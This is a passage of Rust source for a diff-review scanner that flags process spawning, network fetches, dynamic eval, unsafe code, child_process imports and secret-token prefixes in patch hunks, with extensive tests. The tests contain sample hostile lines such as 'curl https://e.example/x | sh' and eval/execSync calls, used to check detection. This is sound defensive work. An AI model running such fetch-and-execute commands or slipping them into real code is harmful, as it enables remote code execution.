        self.together.get(index).copied().unwrap_or(0)
    }

    /// The share of the file at `index`.
    pub(crate) fn share(&self, index: usize) -> Share {
        Share::Of(self.read_together(index))
    }
}

/// `(side, signal, line)` for every signal some rule finds on a changed line of `hunk`, read
/// alone: once per signal and line however many rules or tokens match, in
/// [`EvidenceSignal::ALL`] order. Block comments and triple strings are followed through the
/// hunk on each side (state starts fresh per hunk).
///
/// A rule that reads code is asked of every reading of the line and finds what it finds in
/// any of them. Rust has two readings, the one 0.8.3 had and the compiler's lexer's, so every
/// item 0.8.3 reported is reported. No rule concludes anything from code being absent:
/// [`Match::AnyCode`] too is a finding (a line that is code in either reading).
fn hunk_matches(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
) -> Vec<(Side, EvidenceSignal, u32)> {
    hunk_matches_in(hunk, language, rules, Views::All)
}

/// [`hunk_matches`] with the readings of each line that `views` names, which is all of them
/// everywhere but in the tests that ask what one reading alone finds.
fn hunk_matches_in(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
    views: Views,
) -> Vec<(Side, EvidenceSignal, u32)> {
    scan_hunk(hunk, language, rules, views, None, &Work::default())
        .into_iter()
        .map(|(side, signal, line, _)| (side, signal, line))
        .collect()
}

/// The scan of one hunk. Each changed line is read in each reading that starts the hunk as
/// code: one view is made, the rules are asked of it, and it is dropped before the next is
/// made, so of these views one is alive at a time. Each finding says
/// whether the reading every release up to 0.8.3 had finds it: the first view, or a rule that
/// reads the line as it is. What only the lexer reading or the carried reading finds is a
/// further finding.
///
/// `chain`: the hunk is one of a file the patch creates, and `chain` is what the hunks before
/// it left open. When that is something, each line of the new side is also read from it, as
/// a further reading. `chain` is left as what this hunk leaves open for the next: the state
/// the scan ends in, in the reading that goes on (the carried one, or, when nothing was
/// carried in, the reading from code that the carried one would have been).
fn scan_hunk(
    hunk: &PatchHunk,
    language: Option<Language>,
    rules: &[&Rule],
    views: Views,
    chain: Option<&mut Carried>,
    work: &Work,
) -> Vec<Item> {
    let mut carried = chain.as_deref().copied().unwrap_or_default();
    let carried_in = carried != Carried::default();
    let mut old_state = Readings::default();
    let mut new_state = Readings::default();
    let mut found = Vec::new();
    for line in &hunk.lines {
        let (side, number) = match line.kind {
            PatchLineKind::Context => {
                if let Some(language) = language {
                    // A line of both sides. While the two sides have the same open, one scan
                    // serves both.
                    if old_state == new_state {
                        scan_code(language, &line.text, &mut new_state, views, work, |_, _| ());
                        old_state = new_state;
                    } else {
                        scan_code(language, &line.text, &mut old_state, views, work, |_, _| ());
                        scan_code(language, &line.text, &mut new_state, views, work, |_, _| ());
                    }
                    if carried_in {
                        drop(work.carried_view(language, &line.text, &mut carried));
                    }
                }
                continue;
            }
            PatchLineKind::Added => (Side::New, line.new_line),
            PatchLineKind::Removed => (Side::Old, line.old_line),
        };
        let asking = Asking {
            rules,
            side,
            raw: &line.text,
            work,
        };
        // What the reading every release up to 0.8.3 had finds, and what only a further
        // reading finds, as bits by signal.
        let (mut released, mut further) = (0u16, 0u16);
        if let Some(language) = language {
            let state = if side == Side::New {
                &mut new_state
            } else {
                &mut old_state
            };
            scan_code(
                language,
                &line.text,
                state,
                views,
                work,
                |is_first, text| {
                    if is_first {
                        released = asking.first(Some(text));
                    } else {
                        further |= asking.later(text, released | further);
                    }
                },
            );
            if carried_in && side == Side::New {
                let view = work.carried_view(language, &line.text, &mut carried);
                further |= asking.later(&view.text, released | further);
            }
        } else {
            released = asking.first(None);
        }
        let Some(number) = number else { continue };
        for (at, signal) in EvidenceSignal::ALL.into_iter().enumerate() {
            let by_released = released & (1 << at) != 0;
            if by_released || further & (1 << at) != 0 {
                found.push((side, signal, number, by_released));
            }
        }
    }
    if let Some(chain) = chain {
        *chain = match language {
            _ if carried_in => carried,
            Some(language) => new_state.carried(language),
            None => Carried::default(),
        };
    }
    found
}

/// The rules asked of one changed line. The rules of a signal are asked in their order until
/// one finds something, as they always were: no rule is asked of the first view that 0.8.3
/// did not ask, and a signal that is found is not asked for again in a later view.
struct Asking<'a> {
    rules: &'a [&'a Rule],
    side: Side,
    /// The line as it is.
    raw: &'a str,
    work: &'a Work,
}

impl Asking<'_> {
    fn hits_in(&self, rule: &Rule, text: &str) -> bool {
        self.work.rules.set(self.work.rules.get() + 1);
        match rule.matches {
            Match::Tokens(tokens) => tokens.iter().any(|t| token_in(text, t)),
            Match::AnyCode => !text.trim().is_empty(),
            Match::Secret => looks_like_secret(text),
            Match::Imports(modules) => imports_module(text, self.raw, modules),
        }
    }

    fn of_signal(&self, signal: EvidenceSignal) -> impl Iterator<Item = &&Rule> {
        self.rules
            .iter()
            .filter(move |r| r.signal == signal && r.side == self.side)
    }

    /// The signals found, as bits, by the reading every release up to 0.8.3 had: `view` is
    /// its view of the line, or nothing where there is no language to read code in.
    fn first(&self, view: Option<&str>) -> u16 {
        let mut bits = 0u16;
        for (at, signal) in EvidenceSignal::ALL.into_iter().enumerate() {
            let hit = self.of_signal(signal).any(|rule| match (rule.view, view) {
                (View::Code, Some(view)) => self.hits_in(rule, view),
                // A rule that reads the line as it is; and a rule that reads code where
                // there is no language to read it in (`Scope::Any` code rules).
                (View::Raw, _) | (View::Code, None) => self.hits_in(rule, self.raw),
            });
            bits |= u16::from(hit) << at;
        }
        bits
    }

    /// The signals not in `found` that a further view of the line has, as bits.
    fn later(&self, view: &str, found: u16) -> u16 {
        let mut bits = 0u16;
        for (at, signal) in EvidenceSignal::ALL.into_iter().enumerate() {
            if found & (1 << at) == 0 {
                let hit = self
                    .of_signal(signal)
                    .any(|rule| rule.view == View::Code && self.hits_in(rule, view));
                bits |= u16::from(hit) << at;
            }
        }
        bits
    }
}

/// The readings of `line` that start as code, one at a time: each view is made, given to
/// `read` (with whether it is the first, the reading every release up to 0.8.3 had) and
/// dropped before the next is made. `state` is left as the line leaves it in each reading.
fn scan_code(
    language: Language,
    line: &str,
    state: &mut Readings,
    views: Views,
    work: &Work,
    mut read: impl FnMut(bool, &str),
) {
    let lexer = language == Language::Rust;
    #[cfg(test)]
    let (released_asked, lexer_alone) = (views != Views::Lexer || !lexer, views == Views::Lexer);
    #[cfg(not(test))]
    let (released_asked, lexer_alone) = {
        let Views::All = views;
        (true, false)
    };
    if released_asked {
        let view = work.view(state.released_view(language, line));
        read(true, &view.text);
    }
    #[cfg(test)]
    let lexer = lexer && views != Views::Released;
    if lexer {
        let view = work.view(state.lexer_view(line));
        read(lexer_alone, &view.text);
    }
}

/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)` (also
/// `module.require`), `import(…)`, `import …` or `from …`. The keyword and the opening quote must
/// be code in `code` (the line's code view), so a comment or a string that mentions an import
/// does not count; the specifier is read from `raw` at the same offset. A type-only statement
/// (`import type`, `export type`) and `typeof import(…)` load nothing and do not count
/// (`typeof require(…)` still calls `require`); an
/// `import(…)` type annotation does (it errs toward evidence).
fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
    let c = code.as_bytes();
    let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
        let before = &code[..at];
        let receiver_ok = at == 0
            || !is_boundary_blocker(c[at - 1])
            || (keyword == "require" && before.ends_with("module."));
        let after = at + keyword.len();
        if !receiver_ok
            || c.get(after).is_some_and(|b| is_ident(*b))
            || (keyword == "import" && before.trim_end().ends_with("typeof"))
        {
            return None;
        }
        // Whitespace and any number of `(` may sit between the keyword and the specifier.
        let gap = c[after..]
            .iter()
            .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
            .count();
        let q = after + gap;
        if keyword == "require" && !c[after..q].contains(&b'(') {
            return None;
        }
        let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
        let name = raw.get(q + 1..)?;
        let name = &name[..name.find(char::from(quote))?];
        Some(name.strip_prefix("node:").unwrap_or(name))
    };
    // Every keyword hit in line order, so one forward walk knows which statement each is in
    // and the type-only test runs once per statement: the line stays linear. The hits of the
    // three keywords are taken as they come, the earliest next, and no list of them is kept.
    let mut found = ["require", "import", "from"].map(|keyword| {
        code.match_indices(keyword)
            .map(move |(at, _)| (at, keyword))
            .peekable()
    });
    let mut hits = std::iter::from_fn(move || {
        let next = found
            .iter_mut()
            .filter_map(|hits| hits.peek().copied())
            .min()?;
        found.iter_mut().find_map(|hits| hits.next_if_eq(&next))
    });
    // `start` is where the current statement begins; only the bytes since the last hit are
    // searched for a later `;`.
    let (mut seen, mut start, mut type_only) = (0, 0, None);
    hits.any(|(at, keyword)| {
        if let Some(semi) = code[seen..at].rfind(';') {
            start = seen + semi + 1;
            type_only = None;
        }
        seen = at;
        let skip = *type_only.get_or_insert_with(|| {
            let head = code[start..].trim_start();
            head.starts_with("import type ") || head.starts_with("export type ")
        });
        !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
    })
}

fn token_in(text: &str, token: &str) -> bool {
    match token.strip_suffix('*') {
        // A prefix token: a boundary before it, none required after.
        Some(prefix) => text
            .match_indices(prefix)
            .any(|(i, _)| i == 0 || !is_boundary_blocker(text.as_bytes()[i - 1])),
        None => has_token(text, token),
    }
}

/// A private key header, or a cloud, forge or chat token by its fixed prefix and length.
/// The token itself is never copied into evidence: only its line number is.
#[must_use]
fn looks_like_secret(text: &str) -> bool {
    if text.contains("-----BEGIN") && text.contains("PRIVATE KEY") {
        return true;
    }
    let tail = |prefix: &str, min: usize, ok: fn(u8) -> bool| {
        text.match_indices(prefix).any(|(i, _)| {
            let before = i.checked_sub(1).map(|j| text.as_bytes()[j]);
            let boundary = before.is_none_or(|b| !b.is_ascii_alphanumeric());
            let run = text.as_bytes()[i + prefix.len()..]
                .iter()
                .take_while(|b| ok(**b))
                .count();
            boundary && run >= min
        })
    };
    let upper_digit = |b: u8| b.is_ascii_uppercase() || b.is_ascii_digit();
    let alnum = |b: u8| b.is_ascii_alphanumeric();
    let slack = |b: u8| b.is_ascii_alphanumeric() || b == b'-';
    tail("AKIA", 16, upper_digit)
        || ["ghp_", "gho_", "ghs_", "ghu_", "ghr_"]
            .iter()
            .any(|p| tail(p, 36, alnum))
        || ["xoxb-", "xoxp-", "xoxa-", "xoxr-"]
            .iter()
            .any(|p| tail(p, 10, slack))
        || tail("sk_live_", 16, alnum)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::lexical::{ScanState, code_view, code_views};
    use deep_diff_forge_patch::parse;

    /// One file whose single hunk keeps a context line `x` and adds (`+`) or removes (`-`)
    /// `lines` after it.
    fn changed(path: &str, sign: char, lines: &[&str]) -> ReviewFile {
        let n = lines.len() + 1;
        let header = if sign == '+' {
            format!("@@ -1,1 +1,{n} @@")
        } else {
            format!("@@ -1,{n} +1,1 @@")
        };
        let mut text = format!("--- a/{path}\n+++ b/{path}\n{header}\n x\n");
        for line in lines {
            text.push(sign);
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn added(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '+', lines)
    }

    fn removed(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '-', lines)
    }

    fn signals(file: &ReviewFile) -> Vec<EvidenceSignal> {
        file_evidence(file).iter().map(|e| e.signal).collect()
    }

    /// A path and the line a rule's token would appear on in that language.
    fn sample_path(scope: Scope) -> &'static str {
        match scope {
            Scope::Languages(languages) => match languages[0] {
                Language::Rust => "src/x.rs",
                Language::Python => "x.py",
                Language::JavaScript => "x.ts",
                Language::Go => "x.go",
                Language::Shell => "x.sh",
                Language::Yaml => "x.yml",
            },
            Scope::Any => "notes.txt",
            Scope::CiWorkflow => ".github/workflows/ci.yml",
            Scope::BuildScript => "build.rs",
            Scope::PackageJson => "package.json",
        }
    }

    fn sample_token(token: &str) -> String {
        match token.strip_suffix('*') {
            Some(prefix) => format!("{prefix}_case()"),
            None => format!("{token} x"),
        }
    }

    /// N8: every token in the table has a case that finds it, on the side the rule reads.
    #[test]
    fn every_token_in_the_table_is_found() {
        for rule in RULES {
            if let Match::Imports(modules) = rule.matches {
                for module in modules {
                    let line = format!("const m = require(\"{module}\");");
                    let file = added(sample_path(rule.scope), &[&line]);
                    assert!(signals(&file).contains(&rule.signal), "{module}");
                }
            }
            let Match::Tokens(tokens) = rule.matches else {
                continue;
            };
            for token in tokens {
                let path = sample_path(rule.scope);
                let line = sample_token(token);
                let file = match rule.side {
                    Side::New => added(path, &[&line]),
                    Side::Old => removed(path, &[&line]),
                };
                assert!(
                    signals(&file).contains(&rule.signal),
                    "{} not found for {token:?} in {path}",
                    rule.signal.label()
                );
            }
        }
    }

    /// The same tokens in a comment or a string are not code.
    #[test]
    fn a_token_in_a_comment_or_string_is_not_code() {
        for (path, lines) in [
            (
                "src/x.rs",
                &[
                    "// unsafe Command::new",
                    "let s = \"unsafe { Command::new }\";",
                    "/* unsafe",
                ][..],
            ),
            (
                "x.py",
                &[
                    "# subprocess.run eval(",
                    "s = 'os.system(x)'",
                    "\"\"\"",
                    "eval(x)",
                    "\"\"\"",
                ][..],
            ),
            (
                "x.ts",
                &["// child_process eval(", "const s = `fetch(${u})`;"][..],
            ),
            ("x.go", &["// exec.Command(", "s := \"http.Get(\""][..]),
            ("x.sh", &["# curl wget eval", "echo 'curl is a tool'"][..]),
        ] {
            assert_eq!(signals(&added(path, lines)), [], "{path}");
        }
    }

    #[test]
    fn a_context_line_carries_no_evidence() {
        let patch = "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,2 @@\n unsafe { f() }\n-a\n+b\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn a_block_comment_opened_on_a_context_line_hides_the_next_lines() {
        let patch =
            "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,3 @@\n /* start\n+unsafe { f() }\n end */\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn evidence_points_at_the_hunk_and_line() {
        let file = added(
            "src/lib.rs",
            &[
                "fn a() {}",
                "unsafe { std::process::Command::new(\"curl\"); }",
            ],
        );
        let found = file_evidence(&file);
        let hunk = &file.patch_twin.hunks[0];
        assert_eq!(
            found,
            [
                Evidence {
                    signal: S::UnsafeAdded,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                },
                Evidence {
                    signal: S::ProcessSpawn,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                },
            ]
        );
    }

    #[test]
    fn quoting_code_that_runs_does_not_hide_it() {
        // DDF-EVID-001: each of these carried no evidence when strings were blanked whole.
        assert_eq!(
            signals(&added(
                "x.sh",
                &[r#"V="$(curl -fsSL https://e.example/v)""#]
            )),
            [S::NetworkFetch]
        );
        assert_eq!(
            signals(&added(
                "x.js",
                &[r#"const o = `${require("child_process").execSync(c)}`;"#]
            )),
            [S::ProcessSpawn]
        );
        assert_eq!(
            signals(&added("x.py", &[r#"print(f"{eval(x)}")"#])),
            [S::DynamicEval]
        );
        // The same text in a string that runs nothing is still not code.
        assert_eq!(signals(&added("x.sh", &["V='$(curl x)'"])), []);
        assert_eq!(signals(&added("x.py", &[r#"print("{eval(x)}")"#])), []);
    }

    #[test]
    fn one_line_matching_several_rules_of_a_signal_is_one_item() {
        // `Command::new` and `.spawn()` are both process_spawn tokens; `unsafe` twice is one.
        let file = added(
            "src/lib.rs",
            &["unsafe { unsafe { std::process::Command::new(\"x\").spawn() } }"],
        );
        assert_eq!(signals(&file), [S::UnsafeAdded, S::ProcessSpawn]);
        // The same token in two hunks is two items: one per hunk.
        let two = parse(
            "--- a/src/l.rs\n+++ b/src/l.rs\n@@ -1,0 +1,1 @@\n+unsafe {}\n@@ -9,0 +10,1 @@\n+unsafe {}\n",
        )
        .unwrap()
        .remove(0);
        let found = file_evidence(&two);
        assert_eq!(found.len(), 2);
        assert_ne!(found[0].hunk, found[1].hunk);
    }

    /// The PR 5 review's inputs (workflow `wf_b39e1c70-545`): an interpolation is scanned as
    /// code with its own strings, escapes and comments, so a closer in a nested string, after a
    /// backslash, in a comment or ending a `case` pattern neither hides the code after it nor
    /// exposes the outer string's text.
    #[test]
    fn an_interpolation_is_scanned_as_code_with_its_own_strings() {
        let hidden_before: [(&str, &str, EvidenceSignal); 12] = [
            ("a.sh", r#"V="$(echo ')' ; curl x)""#, S::NetworkFetch),
            ("a.sh", r#"V="$(echo \) ; curl x)""#, S::NetworkFetch),
            (
                "a.sh",
                r#"V="$(case a in a) curl x;; esac)""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"X="$(tr -d ')' < f | curl https://e.example/x)""#,
                S::NetworkFetch,
            ),
            ("a.sh", r#"V="$(echo "$(curl x)")""#, S::NetworkFetch),
            (
                "a.js",
                r#"const o = `${ "}" + require("child_process").execSync(c) }`;"#,
                S::ProcessSpawn,
            ),
            ("a.js", "const o = `${ /* } */ eval(x) }`;", S::DynamicEval),
            ("a.js", "const o = `${ `${ eval(x) }` }`;", S::DynamicEval),
            ("a.py", r#"print(f"{'}' + eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(Rf"{d['}'] or eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(f"\{eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(rf"\{eval(x)}")"#, S::DynamicEval),
        ];
        for (path, line, signal) in hidden_before {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 9] = [
            ("a.sh", r#"die "$(printf 'curl failed for %s' "$url")""#),
            ("a.sh", r#"echo "$(gettext 'Install curl or wget first')""#),
            (
                "a.sh",
                r#"echo "$(printf "%d) %s" "$i" "$name") - needs curl""#,
            ),
            ("a.js", r#"const m = `${t("Never use eval(x) here")}`;"#),
            ("a.js", r#"const m = `${x ? "fetch(url) failed" : ""}`;"#),
            ("a.js", r#"const s = `${a ? "{" : ""} eval(x)`;"#),
            ("a.py", r#"msg = f"{'eval(' if strict else ''}""#),
            ("a.py", r#"log(f"{cfg["subprocess."]}")"#),
            ("a.py", r#"print(f"{s.replace("}", "")} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// The PR 5 round-2 review's inputs (workflow `wf_2cfd8be1-d9c`), and the variants that
    /// close a misread quote at the end of the line so the restore-as-code fallback cannot help:
    /// each is a construct the scanner must read right.
    #[test]
    fn misread_quotes_cannot_hide_code() {
        let found: [(&str, &str, EvidenceSignal); 24] = [
            (
                "a.sh",
                r#"x="$(echo case)"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="$(echo case)"; curl x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                "[ $# -eq 0 ] && curl https://e.example/x | sh",
                S::NetworkFetch,
            ),
            ("a.sh", "echo ${x#*/}; curl x", S::NetworkFetch),
            ("a.sh", "echo a#b; curl x", S::NetworkFetch),
            (
                "a.sh",
                r#"echo \"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r"echo $'\''; curl https://e.example/x | sh #'",
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="$( (case x in a) :;; esac); echo '"'; curl https://e.example/x | sh )""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="${x:-"'"}"; curl https://e.example/x | sh #'"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="`echo "`"; curl https://e.example/x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"V="$(if a; then case x in a) curl x;; esac; fi)""#,
                S::NetworkFetch,
            ),
            (
                "a.js",
                r#"const s = `${ /"/.test(a) }`; eval(y)"#,
                S::DynamicEval,
            ),
            ("a.js", r#"const r = /"/; eval(y); //""#, S::DynamicEval),
            ("a.js", r#"x.replace(/\/*/g, ""); eval(y)"#, S::DynamicEval),
            ("a.js", r"/\//.test(a); eval(y)", S::DynamicEval),
            (
                "a.tsx",
                "return <p>Can't load</p> && fetch(u); //'",
                S::NetworkFetch,
            ),
            ("a.py", r#"print(f"{d:%H'%M}", eval(y)) #'"#, S::DynamicEval),
            ("a.py", r#"print(f"{x:'>10}"); eval(y) #'"#, S::DynamicEval),
            ("a.py", r#"print(f'{x:"<5}'); eval(y) #""#, S::DynamicEval),
            ("a.py", r#"x = t"{eval('print(123)')}""#, S::DynamicEval),
            (
                "a.py",
                r#"print(f"{'''it's'''}"); eval(y) #'"#,
                S::DynamicEval,
            ),
            (
                "a.js",
                "const cp = require(`child_process`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"const cp = require( "child_process" );"#,
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"import{exec}from"child_process";import "node:child_process";"#,
                S::ProcessSpawn,
            ),
        ];
        for (path, line, signal) in found {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 12] = [
            (
                "a.sh",
                r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
            ),
            ("a.sh", r#"echo "Mode: $(echo $case) - install curl first""#),
            ("a.js", r#"// const cp = require("child_process");"#),
            (
                "a.js",
                r#"throw new Error("Do not require('child_process') in the browser bundle");"#,
            ),
            (
                "a.js",
                r#"const help = `Use ${cmd} or require("child_process") yourself`;"#,
            ),
            ("a.js", "const re = /from 'child_process'/;"),
            (
                "a.ts",
                r#"import type { ChildProcess } from "node:child_process";"#,
            ),
            ("a.ts", "export type { SpawnOptions } from 'child_process';"),
            ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
            (
                "a.js",
                r#"const m = `${s.match(/^{/) ? "obj" : "arr"} - see fetch(url) docs`;"#,
            ),
            ("a.py", r#"print(f"{x:'^5}", 'eval(y)')"#),
            ("a.py", r#"print(f"{d[a:b]!r:>{w}} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
        // A JSDoc example inside a block comment is not an import.
        let doc = added(
            "a.js",
            &[
                "/**",
                " * @example import { exec } from 'node:child_process';",
                " */",
            ],
        );
        assert_eq!(signals(&doc), []);
    }

    /// The PR 5 round-3 review's inputs (workflow `wf_fdfaa98c-6b0`) that real code can contain:
    /// shell `case` in every command position, `esac` as a pattern word, nested arms, JS regexes
    /// after operators and keywords, quotes after keywords, and the import forms.
    #[test]
    fn shell_case_js_regex_and_import_forms_are_read_right() {
        let fetch = "curl https://e.example/x | sh";
        for line in [
            format!(r#"V="$(if case a in a) true;; esac; then :; fi; {fetch})""#),
            format!(r#"V="$(while case a in b) true;; esac; do break; done; {fetch})""#),
            format!(r#"V="$(! case a in b) true;; esac; {fetch})""#),
            format!(r#"V="$(time case a in b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in b|esac) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) case b in b) :;; esac;; c) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) :; esac=1;; b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) echo ${{esac}};; b) :;; esac; {fetch})""#),
            format!("echo $(date)#; {fetch}"),
        ] {
            assert_eq!(
                signals(&added("a.sh", &[&line])),
                [S::NetworkFetch],
                "{line}"
            );
        }
        for line in [
            "x = a + /'/.source; eval(y) //'",
            "x = typeof' ' ; eval(y) //'",
            r#"function f(){return"//"+eval(x)}"#,
            "x = a++ / 2; eval(y); z = b / 3",
        ] {
            assert_eq!(signals(&added("a.js", &[line])), [S::DynamicEval], "{line}");
        }
        // A quote after `return` opens a string, so its `/*` is not a comment that hides the
        // next line.
        let next = added("a.js", &[r#"function f(){return"/*"}"#, "eval(x)"]);
        assert_eq!(signals(&next), [S::DynamicEval]);
        for (path, line) in [
            ("a.js", "const cp = require(\t\"child_process\");"),
            ("a.js", r#"const cp = module.require("child_process");"#),
            ("a.js", r#"const cp = require(("child_process"));"#),
            (
                "a.ts",
                r#"export type T = 1; const cp = require("child_process");"#,
            ),
            ("a.js", r#"const o = { m: import("child_process") };"#),
            // A type annotation loads nothing, but it is counted: the rule errs toward evidence.
            (
                "a.ts",
                r#"let p: import("child_process").ChildProcess | undefined;"#,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [S::ProcessSpawn], "{line}");
        }
        for line in [
            r#"echo "Ran: $(basename ${case}) - fetch the logs with curl""#,
            r#"echo "$(case $1 in (a) echo x;; esac) - install curl first""#,
        ] {
            assert_eq!(signals(&added("a.sh", &[line])), [], "{line}");
        }
    }

    /// The final PR 5 review's regressions against main (workflow `wf_bbb5e9f1-254`): common
    /// code the branch misread, and lines that made the import rule quadratic.
    #[test]
    fn common_typescript_continuations_and_raw_strings_keep_their_evidence() {
        for (path, line, signal) in [
            (
                "n.ts",
                "const pct = (stats.get(key)! / total) * 100; const res = await fetch(`/api/stats/${key}`);",
                S::NetworkFetch,
            ),
            (
                "n.ts",
                r#"const ms = timings[name]! / 1000; void fetch("/log", { method: "POST" });"#,
                S::NetworkFetch,
            ),
            (
                "n.ts",
                "const pct = done! / total; const out = execSync(`du -sh ${dir}/`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r"const run = cmd => /^'/.test(cmd) ? null : execSync(cmd, { shell: '/bin/sh' });",
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r#"let root = Path::new(r"C:\"); let out = Command::new("cmd").output()?;"#,
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r##"let s = r#"a "quoted" \"#; unsafe { f() }"##,
                S::UnsafeAdded,
            ),
            (
                "src/a.rs",
                r#"let b = br"\"; unsafe { f() }"#,
                S::UnsafeAdded,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        // A line that continues an expression with `/` divides; one after `=` opens a regex.
        let divided = added(
            "m3.js",
            &[
                "const elapsed = (Date.now() - start)",
                "  / 1000; fetch(`/api/timing/${elapsed}`);",
            ],
        );
        assert_eq!(signals(&divided), [S::NetworkFetch]);
        let regex = added("m3.js", &["const re =", "  /fetch(/; const x = 1;"]);
        assert_eq!(signals(&regex), []);
        // A raw string's text is still text, and an ordinary string still escapes.
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = r"unsafe";"#])), []);
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = "\"unsafe";"#])), []);
    }

    #[test]
    fn the_import_rule_is_linear_on_long_lines() {
        within_deadline(|| {
            let start = ScanClock::start();
            for unit in [
                "Array.from(x),",
                "from ",
                "require ",
                "import ",
                "require(require(",
            ] {
                let line = unit.repeat(200_000);
                assert_eq!(signals(&added("a.js", &[&line])), [], "{unit}");
            }
            let spaced = format!(";{}from 'child_process'", " ".repeat(200_000));
            assert_eq!(signals(&added("a.js", &[&spaced])), [S::ProcessSpawn]);
            // Linear scans of these lines took about 2 s in a debug build; the quadratic import
            // rule of eee2b4c^ took about 66 s.
            let spent = start.elapsed();
            assert!(
                spent < std::time::Duration::from_secs(15),
                "the long lines took {spent:?} of {}",
                start.kind
            );
        });
    }

    /// The time a scan spends: the thread's own CPU time where Linux reports it, so a busy host
    /// does not fail the bound (a starved run measured 1.8 s of CPU in over 10 s of wall time),
    /// and wall time elsewhere.
    struct ScanClock {
        kind: &'static str,
        cpu_ns: Option<u64>,
        wall: std::time::Instant,
    }

    impl ScanClock {
        fn start() -> Self {
            let cpu_ns = thread_cpu_ns();
            #[expect(
                clippy::disallowed_methods,
                reason = "test door: the fallback clock where no CPU time is reported"
            )]
            let wall = std::time::Instant::now();
            let kind = if cpu_ns.is_some() {
                "thread CPU time"
            } else {
                "wall time"
            };
            Self { kind, cpu_ns, wall }
        }

        fn elapsed(&self) -> std::time::Duration {
            match (self.cpu_ns, thread_cpu_ns()) {
                (Some(then), Some(now)) => std::time::Duration::from_nanos(now - then),
                _ => self.wall.elapsed(),
            }
        }
    }

    /// The calling thread's CPU time in nanoseconds: the first field of Linux's
    /// `/proc/thread-self/schedstat`, or `None` where that file does not exist.
    fn thread_cpu_ns() -> Option<u64> {
        let stat = std::fs::read_to_string("/proc/thread-self/schedstat").ok()?;
        stat.split_whitespace().next()?.parse().ok()
    }

    /// Run `work` on its own thread and fail if it takes more than two minutes of wall time.
    /// This bound only keeps a hang from stalling the suite, so a diff-mutation run reports a
    /// looping mutant as caught rather than as a timeout; the scan's cost is bounded by
    /// [`ScanClock`] inside the work.
    fn within_deadline<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> T {
        let (done, wait) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = done.send(work());
        });
        wait.recv_timeout(std::time::Duration::from_secs(120))
            .expect("a long line was scanned within two minutes")
    }

    /// The import rule's receiver, boundary, `typeof` and statement decisions, each pinned.
    #[test]
    fn import_rule_decisions_are_exact() {
        for (line, spawn) in [
            (r#"const cp = foo.require("child_process");"#, false),
            (r#"const cp = requirex("child_process");"#, false),
            (r#"const t = typeof require("child_process");"#, true),
            (
                r#"x = Array.from(y); import type {A} from "child_process";"#,
                false,
            ),
            (
                r#"x = Array.from(y); import {A} from "child_process";"#,
                true,
            ),
        ] {
            let expected: &[EvidenceSignal] = if spawn { &[S::ProcessSpawn] } else { &[] };
            assert_eq!(signals(&added("a.ts", &[line])), expected, "{line}");
        }
    }

    #[test]
    fn child_process_imports_are_spawn_evidence() {
        for line in [
            r#"const cp = require("child_process");"#,
            "import { execFile } from 'node:child_process';",
            r#"const { spawn } = await import("child_process");"#,
        ] {
            assert_eq!(
                signals(&added("a.js", &[line])),
                [S::ProcessSpawn],
                "{line}"
            );
        }
        // Naming another module, or the name alone in a message, is not.
        assert_eq!(
            signals(&added("a.js", &[r#"log("child process done")"#])),
            []
        );
    }

    #[test]
